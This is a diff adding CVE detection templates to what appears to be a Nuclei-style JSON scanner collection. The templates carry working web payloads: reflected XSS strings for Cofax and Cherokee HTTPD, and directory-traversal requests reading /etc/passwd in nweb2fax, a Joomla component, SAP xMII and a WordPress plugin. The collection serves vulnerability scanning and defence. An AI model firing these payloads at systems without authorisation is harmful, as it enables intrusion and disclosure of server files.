@@ -37,6 +37,88 @@
       ]
     },
     {
+      "id": "CVE-2005-4385",
+      "info": {
+        "author": "geeknik",
+        "description": "Cross-site scripting vulnerability in search.htm in Cofax 2.0 RC3 and earlier allows remote attackers to inject arbitrary web script or HTML via the searchstring parameter.",
+        "name": "Cofax <= 2.0RC3 XSS",
+        "reference": [
+          "http://pridels0.blogspot.com/2005/12/cofax-xss-vuln.html",
+          "https://nvd.nist.gov/vuln/detail/CVE-2005-4385"
+        ],
+        "severity": "medium",
+        "tags": "cofax,xss,cve,cve2005"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "'>\"</script><script>alert(document.domain)</script>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/search.htm?searchstring2=&searchstring=%27%3E%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2006-1681",
+      "info": {
+        "author": "geeknik",
+        "description": "Cross-site scripting (XSS) vulnerability in Cherokee HTTPD 0.5 and earlier allows remote attackers to inject arbitrary web script or HTML via a malformed request that generates an HTTP 400 error, which is not properly handled when the error message is generated.",
+        "name": "Cherokee HTTPD <=0.5 XSS",
+        "reference": [
+          "https://www.securityfocus.com/bid/17408",
+          "https://nvd.nist.gov/vuln/detail/CVE-2006-1681"
+        ],
+        "severity": "medium",
+        "tags": "cherokee,httpd,xss,cve,cve2006"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/%2F..%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2007-0885",
       "info": {
         "author": "geeknik",
@@ -188,6 +270,45 @@
           "matchers-condition": "and",
           "raw": [
             "GET /index.php?sl=../../../../../../../etc/passwd%00 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2008-6668",
+      "info": {
+        "author": "geeknik",
+        "description": "Multiple directory traversal vulnerabilities in nweb2fax 0.2.7 and earlier allow remote attackers to read arbitrary files via .. in the id parameter to comm.php and var_filename parameter to viewrq.php.",
+        "name": "nweb2fax <= 0.2.7 Directory Traversal",
+        "reference": [
+          "https://www.exploit-db.com/exploits/5856",
+          "https://nvd.nist.gov/vuln/detail/CVE-2008-6668"
+        ],
+        "severity": "high",
+        "tags": "nweb2fax,lfi,cve,cve2008"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/comm.php?id=../../../../../../../../../../etc/passwd",
+            "{{BaseURL}}/viewrq.php?format=ps&var_filename=../../../../../../../../../../etc/passwd"
           ]
         }
       ]
@@ -834,6 +955,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/flash-album-gallery/facebook.php?i=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2011-4804",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the obSuggest (com_obsuggest) component before 1.8 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component com_kp - 'Controller' Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/36598\n- https://www.cvedetails.com/cve/CVE-2011-4804\n",
+        "severity": "high",
+        "tags": "cve,cve2011,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_kp&controller=../../../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -4357,6 +4512,40 @@
                 "00000034fffe3900000020006e007400200061007500740068006f0072006900740079005c00730079007300740065006d000a0000000000"
               ]
             }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-2389",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the GetFileList function in the SAP Manufacturing Integration and Intelligence (xMII) component 15.0 for SAP NetWeaver 7.4 allows remote attackers to read arbitrary files via a .. (dot dot) in the Path parameter to /Catalog, aka SAP Security Note 2230978.",
+        "name": "SAP xMII 15.0 - Directory Traversal",
+        "reference": "- https://erpscan.io/advisories/erpscan-16-009-sap-xmii-directory-traversal-vulnerability/\n- https://www.cvedetails.com/cve/CVE-2016-2389\n",
+        "severity": "high",
+        "tags": "cve,cve2016,lfi,sap"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/XMII/Catalog?Mode=GetFileList&Path=Classes/../../../../../../../../../../../../etc/passwd"
           ]
         }
       ]
@@ -12234,6 +12423,39 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://burpcollaborator.net"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-9618",
+      "info": {
+        "author": "0x_Akoko",
+        "name": "GraceMedia Media Player 1.0 - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/46537\n- https://nvd.nist.gov/vuln/detail/CVE-2019-9618\n",
+        "severity": "critical",
+        "tags": "cve,cve2019,wordpress,wp-plugin,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd"
           ]
         }
       ]
